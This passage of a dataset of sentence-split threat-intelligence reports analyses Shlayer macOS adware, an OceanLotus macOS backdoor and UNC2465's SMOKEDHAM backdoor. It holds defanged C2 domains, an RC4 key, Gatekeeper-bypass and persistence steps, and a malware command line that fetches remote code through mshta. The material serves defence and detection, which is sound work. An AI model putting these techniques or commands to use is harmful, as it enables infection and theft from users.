        "id": "cti_reports_filtered/r-611.md:::S17",
        "text": "The paths noted below represent only those of the original variants directly observed and verified by TAU via binary analysis or across our customer base.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S18",
        "text": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S19",
        "text": "This is an important distinction for detection, as the \u20130 (force http 1.0) argument is not generally used legitimately, whereas usage of \u2013s (silent) and \u2013S (show errors) is more common.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S20",
        "text": "The following represents a high-level overview of the process execution and infection chain for a typical Shlayer installation:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S21",
        "text": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S22",
        "text": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S23",
        "text": "When this DMG is mounted and the installer executed, a .command script is executed from a hidden directory in the mounted volume.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S24",
        "text": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S25",
        "text": "A sample .command script is shown in Figure 2 below, along with the two subsequent decoded/decrypted scripts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S26",
        "text": "Although the format and sequence of these scripts vary among samples, the basic overall execution chain remains the same.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S27",
        "text": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S28",
        "text": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S29",
        "text": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system) \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S30",
        "text": "- Generates a \u201cSession GUID\u201d using uuidgen \n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S31",
        "text": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S32",
        "text": "For example:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S33",
        "text": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S34",
        "text": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S35",
        "text": "- Makes the binary within the unzipped .app executable using chmod +x\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S36",
        "text": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S37",
        "text": "- Performs a killall Terminal to kill the running script\u2019s terminal window\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S38",
        "text": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S39",
        "text": "Once the malware has elevated to root privileges, it attempts to download additional software (observed to be adware in the analyzed samples) and bypasses Gatekeeper for the downloaded software.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S40",
        "text": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S41",
        "text": "Furthermore, many of the payloads contained within the second stage download are signed with a valid developer ID as seen in red in the screenshot below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S42",
        "text": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S43",
        "text": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S44",
        "text": "Although some of this process has changed with the introduction of notarization in macOS Mojave version 10.14.5, in previous versions a dialog such as the following would be displayed when opening an application that was not installed from the App Store:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S45",
        "text": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S46",
        "text": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S47",
        "text": "As Apple Developer accounts have previously been fairly easy to register (just requiring an Apple ID and $99 yearly fee), almost anyone could create an application with a valid certificate.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S48",
        "text": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S49",
        "text": "As of February 27th 2019, two-factor authentication (2FA) is required for the main holder of a team\u2019s Apple Developer account to sign in with their Apple ID, creating an additional layer of security for the creation of certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S50",
        "text": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S51",
        "text": "Validity of an application\u2019s certificate can be verified using the spctl or codesign commands as seen below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S52",
        "text": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S53",
        "text": "Sanchez Scarlett Nichols Carson Clement Dana Jasper Osmund Rios Becky Simmons Brianna Fergus Basil Beatrix Hilary Andrews Declan Raymond Amanda Arnold Eleanor Blanche Augusta Bennett Marvin Janson Chase Leighton Ganesa Mendez Melody",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S54",
        "text": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S55",
        "text": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S56",
        "text": "This means that if the first stage is able to execute, the second stage script is likely to run without further prompt to the user after initial authentication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S57",
        "text": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S58",
        "text": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S59",
        "text": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S60",
        "text": "Furthermore, there have been several changes to the security of the Apple Developer program with the introduction of notarization in macOS 10.14.5.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S61",
        "text": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S62",
        "text": "We continue to monitor this threat however and will provide updates should anything change.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S63",
        "text": "The status of a notarized application can be verified using the XCode command line tool stapler with the validate parameter as seen below \u2013 this command will return \u201cThe validate action worked!\u201d for a valid notarized app, but will return nothing if the app has not been notarized.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S64",
        "text": "Due to the number of known IOCs for this malware",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S65",
        "text": ", hash-based prevention is extremely ineffective for this campaign as executables are being frequently modified and recompiled.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S66",
        "text": "As of today, there are thousands of unique known samples and the list continues to grow.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S67",
        "text": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S68",
        "text": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S69",
        "text": "This succession of activity can be seen in the sequence of screenshots below which show the execution of the final script in the first stage, using bash along with the system utilities described above to download and execute the second stage payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S70",
        "text": "After the second stage malware downloaded by curl has been entrenched and gained root access, it is able to then download and install additional software as seen in the process tree below:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S71",
        "text": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S72",
        "text": "Even though we know of no known cases of Shlayer installing any software more nefarious than additional adware or cryptominers, it has the ability to install rootkits or other more serious threats once entrenched.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S73",
        "text": "Furthermore, while the analyzed samples above do not attempt to conceal their network activity, newer samples have been reported to use further obfuscation of payloads and encryption of network traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S74",
        "text": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md:::S75",
        "text": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S0",
        "text": "The sample arrives as an app bundled in a Zip archive.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S1",
        "text": "It uses the icon for a Word document file as a disguise, attempting to pass itself off as a legitimate document file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S2",
        "text": "Another technique it uses to evade detection is adding special characters to its app bundle name.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S3",
        "text": "When a user looks for the fake doc folder via the macOS Finder app or the terminal command line, the folder's name shows \"ALL tim nha Chi Ngoc Canada.doc\" (\u201ct\u00ecm nh\u00e0 Ch\u1ecb Ng\u1ecdc\u201d roughly translates to \u201cfind Mrs. Ngoc\u2019s house\u201d).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S4",
        "text": "However, checking the original Zip file that contains the folder shows 3 unexpected bytes between \".\" and \"doc\".",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S5",
        "text": "The 3 bytes \"efb880\" is in UTF-8 encoding.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S6",
        "text": "According to UTF-8 mapping, the related Unicode code is \"U+FE00\".\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S7",
        "text": "\"U+FE00\" is a special Unicode control character with name variation selector-1, which provides the visual appearance of a CJK compatibility ideograph.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S8",
        "text": "In this case, the preceding character is the general character \".\", so the variation selector does not change the visual appearance.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S9",
        "text": "The operating system sees the app bundle as an unsupported directory type, so as a default action the \u201copen\u201d command is used to execute the malicious app.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S10",
        "text": "Otherwise, if the postfix is .doc without special characters, Microsoft Word is called to open the app bundle as a document; but since it is not a valid document, the app fails to open it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S11",
        "text": "Here is the code signing information for the app bundle sample.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S12",
        "text": "The app bundle contains two notable files:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S13",
        "text": "- ALL tim nha Chi Ngoc Canada: The shell script containing the main malicious routines",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S14",
        "text": "- configureDefault.def: The word file displayed during execution",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S15",
        "text": "When the shell script was run, it performed the following routines:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S16",
        "text": "- Delete the file quarantine attribute for the files in \"*ALL tim nha Chi Ngoc Canada.?doc*\u201d\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S17",
        "text": "- Attempt to remove file quarantine attribute of the files in the system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S18",
        "text": "- Copy \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(doc)\" to \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S19",
        "text": "- Open \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S20",
        "text": "- Extract the b64-encoded fat binary to \"ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def(fat - binary)\", which is the second-stage payload\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S21",
        "text": "- Change access permission of second-stage payload to execute the launch of the second-stage payload\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S22",
        "text": "- Delete the malware app bundle \"ALL tim nha Chi Ngoc Canada.?doc\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S23",
        "text": "- Copy \"/tmp/ALL tim nha Chi Ngoc Canada.doc(doc)\" to \"{execution directory}/ALL tim nha Chi Ngoc Canada.doc\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S24",
        "text": "- Delete \"/tmp/ALL tim nha Chi Ngoc Canada.doc\"\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S25",
        "text": "When executed, the second stage payload (ALL tim nha Chi Ngoc Canada.?doc/Contents/Resources/configureDefault.def) performs the following malware routines:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S26",
        "text": "- Drop third-stage payload to ~/Library/User Photos/mount_devfs",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S27",
        "text": "- Create persistence for the sample by creating ~/Library/LaunchAgents/com.apple.marcoagent.voiceinstallerd.plist",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S28",
        "text": "- Use the touch command to change the timestamp of the sample\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S29",
        "text": "- Delete itself",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S30",
        "text": "In the third-stage payload (~/Library/User Photos/mount_devfs), the strings are encrypted with custom encryption using base64 encoding and byte manipulation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S31",
        "text": "Like older versions of the OceanLotus backdoor, the new version contains two main functions: one for collecting operating system information and submitting this to its malicious C&C servers and receiving additional C&C communication information, and another for the backdoor capabilities.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S32",
        "text": "It collects the following information from the infected system by invoking the following commands:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S33",
        "text": "The collected information is encrypted and sent to the malware C&C server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S34",
        "text": "It also receives commands from the same server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S35",
        "text": "Here are the C&C servers used by the malware:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S36",
        "text": "- mihannevis[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S37",
        "text": "- mykessef[.]com",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S38",
        "text": "- idtpl[.]org",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S39",
        "text": "The new variant\u2019s backdoor capabilities are similar to those of the old OceanLotus sample, as detailed in the code excerpts below:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-625.md:::S40",
        "text": "Below are the supported commands and their respective codes (taken from an earlier blog post that covered OceanLotus).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S0",
        "text": "Mandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S1",
        "text": "The downloaded file was extracted to",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S2",
        "text": "C:\\Users\\[username]\\Downloads\\06212019-General-SMARTPSS-Win32-ChnEng-IS\\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S3",
        "text": "Mandiant confirmed the user intended to download, install, and use the SmartPSS software.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S4",
        "text": "Figure 2 shows an image of the download page used for SmartPSS software.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S5",
        "text": "The installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S6",
        "text": "We were able to extract the malicious installer script and files for analysis using 7-Zip.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S7",
        "text": "The relevant section of this installer script is shown below in Figure 3.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S8",
        "text": "The installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S9",
        "text": "The former is a clean installer from the original developer and is launched first, installing the software as the user may expect.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S10",
        "text": "The latter is launched with a command line URL executing the content.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S11",
        "text": "The smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S12",
        "text": "Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S13",
        "text": "This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S14",
        "text": "Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S15",
        "text": "Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S16",
        "text": "Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S17",
        "text": "According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S18",
        "text": "C:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S19",
        "text": "The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S20",
        "text": "Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S21",
        "text": "At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S22",
        "text": "It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S23",
        "text": "A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S24",
        "text": "Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S25",
        "text": "Within seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S26",
        "text": "csc.exe /noconfig /fullpaths @'C:\\Users\\ [username]\\AppData\\Local\\Temp\\qnxfhfim\\qnxfhfim.cmdline'",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S27",
        "text": "Mandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S28",
        "text": ".../t:library /utf8output /R:'System.dll' /R:'C:\\windows\\Microso",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S29",
        "text": "After the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S30",
        "text": "The SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S31",
        "text": "The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S32",
        "text": "The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S33",
        "text": "In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S34",
        "text": "The SMOKEDHAM backdoor source code is embedded as an encrypted string.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S35",
        "text": "The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S36",
        "text": "After defining a new .NET class for the backdoor, the dropper executes the backdoor's entry point.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S37",
        "text": "The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S38",
        "text": "Figure 7 shows the deobfuscated SMOKEDHAM dropper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S39",
        "text": "SMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S40",
        "text": "The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S41",
        "text": "SMOKEDHAM communicates with its C2 server using HTTPS.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S42",
        "text": "The backdoor uses domain fronting to obfuscate its true C2 server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S43",
        "text": "The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S44",
        "text": "Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S45",
        "text": "The communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S46",
        "text": "The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S47",
        "text": "The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S48",
        "text": "The ID field contains a unique value generated by the backdoor for the target system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S49",
        "text": "The UUID field may contain a unique value used to track command output or be empty.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S50",
        "text": "When the C2 server responds with a command to execute, it sets the UUID field to a unique value.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S51",
        "text": "SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S52",
        "text": "The Data field may contain RC4-encrypted, Base64-encoded command data or be empty.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S53",
        "text": "The backdoor uses the Data field to send command output to its C2 server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S54",
        "text": "The C2 server uses the Data field to send commands to the backdoor to execute.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S55",
        "text": "The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S56",
        "text": "Mandiant observed the RC4 key UwOdHsFXjdCOIrjTCfnblwEZ used for RC4 encryption and decryption.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S57",
        "text": "SMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S58",
        "text": "The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S59",
        "text": "If the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S60",
        "text": "The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S61",
        "text": "In addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S62",
        "text": "The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S63",
        "text": "SMOKEDHAM was observed executing commands on the target system using PowerShell.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-711.md:::S64",
